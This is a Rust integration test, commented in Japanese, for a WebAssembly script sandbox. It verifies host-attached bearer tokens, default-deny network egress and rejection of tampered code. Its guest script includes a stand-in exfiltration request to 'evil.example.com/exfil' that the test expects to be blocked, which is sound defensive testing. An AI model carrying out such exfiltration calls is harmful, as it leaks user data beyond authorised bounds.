//! B2 関数実行の結合テスト（Task 9.12 受け入れ条件）。
//!
//! 実 QuickJS-in-wasmtime（埋め込みゲスト wasm）＋モックゲートウェイ（ループバック axum）で:
//! - 関数がサンドボックス内で起動・実行・破棄され、能力呼び出しがゲートウェイ HTTP に
//!   **ホスト付与の Bearer** で届く（ゲストは token を知らない）
//! - egress が default-deny（allowlist 外は `egress_denied`・allowlist 内のみ許可）
//! - サーバコードの content address 不一致は実行拒否

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::sync::{Arc, Mutex};

use app_platform::{FunctionActor, FunctionInvocation, FunctionRunner};
use axum::{extract::State, routing::get, Json, Router};
use script_runtime::ScriptEngine;
use storage::content_address::{miniapp_bundle_key, sha256_hex};
use storage::{ObjectStore, ObjectStoreError};
use uuid::Uuid;

/// メモリ ObjectStore（コード置き場）。
#[derive(Default)]
struct MemStore(Mutex<std::collections::HashMap<String, Vec<u8>>>);

#[async_trait::async_trait]
impl ObjectStore for MemStore {
    async fn ensure_bucket(&self) -> Result<(), ObjectStoreError> {
        Ok(())
    }
    async fn presign_put(
        &self,
        _: &str,
        _: std::time::Duration,
        _: i64,
    ) -> Result<String, ObjectStoreError> {
        Ok(String::new())
    }
    async fn presign_get(
        &self,
        _: &str,
        _: std::time::Duration,
        _: Option<&str>,
        _: Option<&str>,
    ) -> Result<String, ObjectStoreError> {
        Ok(String::new())
    }
    async fn presign_get_internal(
        &self,
        _: &str,
        _: std::time::Duration,
    ) -> Result<String, ObjectStoreError> {
        Ok(String::new())
    }
    async fn read_and_hash(&self, k: &str) -> Result<(String, u64), ObjectStoreError> {
        Err(ObjectStoreError::NotFound(k.into()))
    }
    async fn put_object(&self, k: &str, b: Vec<u8>, _: &str) -> Result<(), ObjectStoreError> {
        self.0.lock().unwrap().insert(k.into(), b);
        Ok(())
    }
    async fn get_object(&self, k: &str) -> Result<Vec<u8>, ObjectStoreError> {
        self.0
            .lock()
            .unwrap()
            .get(k)
            .cloned()
            .ok_or_else(|| ObjectStoreError::NotFound(k.into()))
    }
    async fn exists(&self, _: &str) -> Result<bool, ObjectStoreError> {
        Ok(false)
    }
    async fn copy(&self, _: &str, _: &str) -> Result<(), ObjectStoreError> {
        Ok(())
    }
    async fn delete(&self, _: &str) -> Result<(), ObjectStoreError> {
        Ok(())
    }
    async fn list_prefix(
        &self,
        _: &str,
        _: Option<&str>,
    ) -> Result<(Vec<String>, Option<String>), ObjectStoreError> {
        Ok((vec![], None))
    }
    async fn delete_batch(&self, _: &[String]) -> Result<(), ObjectStoreError> {
        Ok(())
    }
}

/// モックゲートウェイ: /gw/data/tables を返し、受信 Authorization を記録する。
#[derive(Clone, Default)]
struct MockGateway {
    auth_seen: Arc<Mutex<Vec<String>>>,
}

async fn mock_tables(
    State(gw): State<MockGateway>,
    headers: axum::http::HeaderMap,
) -> Json<serde_json::Value> {
    gw.auth_seen.lock().unwrap().push(
        headers
            .get("authorization")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string(),
    );
    Json(serde_json::json!([{ "id": "t-1", "name": "expense" }]))
}

const SCRIPT: &str = r#"
function main(input) {
  var tables = Shiki.data.listTables();
  Shiki.log.info("tables fetched");
  var egress;
  try {
    Shiki.http.request({ url: "http://evil.example.com/exfil" });
    egress = "allowed";
  } catch (e) {
    egress = e.code;
  }
  return { fn: input.function, actor: input.actor, tables: tables, egress: egress };
}
"#;

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn function_runs_in_sandbox_with_host_attached_bearer_and_egress_deny() {
    // モックゲートウェイをループバックで起動。
    let gw = MockGateway::default();
    let app = Router::new()
        .route("/gw/data/tables", get(mock_tables))
        .with_state(gw.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

    // サーバコードを content address で配置。
    let tenant = format!("t-{}", Uuid::new_v4());
    let sha = sha256_hex(SCRIPT.as_bytes());
    let store = Arc::new(MemStore::default());
    store.0.lock().unwrap().insert(
        miniapp_bundle_key(&tenant, &sha),
        SCRIPT.as_bytes().to_vec(),
    );

    let engine = Arc::new(ScriptEngine::new().expect("engine"));
    let runner = FunctionRunner::new(engine, store.clone(), format!("http://{addr}")).unwrap();

    let outcome = runner
        .run(
            &sha,
            FunctionInvocation {
                tenant_id: tenant.clone(),
                app_id: Uuid::new_v4(),
                function: "on_approved".into(),
                payload: serde_json::json!({ "record": "r1" }),
                bearer: "test-service-token".into(),
                actor: FunctionActor::Service,
                egress_allowlist: vec!["api.partner.example".into()],
            },
        )
        .await
        .expect("run");
    assert!(outcome.ok, "{outcome:?}");
    let v = &outcome.value;
    assert_eq!(v["fn"], "on_approved");
    assert_eq!(v["actor"], "service");
    assert_eq!(v["tables"][0]["name"], "expense");
    // egress default-deny: allowlist 外は egress_denied コードで拒否される。
    assert_eq!(v["egress"], "egress_denied");
    // ゲートウェイに届いた Bearer は**ホストが付与**したもの（ゲスト由来ではない）。
    let seen = gw.auth_seen.lock().unwrap().clone();
    assert_eq!(seen, vec!["Bearer test-service-token".to_string()]);
    // ログはホスト側に集約される。
    assert!(
        outcome.logs.iter().any(|l| l.contains("tables fetched")),
        "{:?}",
        outcome.logs
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn tampered_code_is_rejected() {
    let tenant = format!("t-{}", Uuid::new_v4());
    let sha = sha256_hex(SCRIPT.as_bytes());
    let store = Arc::new(MemStore::default());
    // content address と異なる内容（改竄）を置く。
    store.0.lock().unwrap().insert(
        miniapp_bundle_key(&tenant, &sha),
        b"function main(){}".to_vec(),
    );
    let engine = Arc::new(ScriptEngine::new().expect("engine"));
    let runner = FunctionRunner::new(engine, store, "http://127.0.0.1:1".into()).unwrap();
    let err = runner
        .run(
            &sha,
            FunctionInvocation {
                tenant_id: tenant,
                app_id: Uuid::new_v4(),
                function: "f".into(),
                payload: serde_json::Value::Null,
                bearer: "t".into(),
                actor: FunctionActor::User,
                egress_allowlist: vec![],
            },
        )
        .await;
    assert!(err.is_err(), "{err:?}");
}
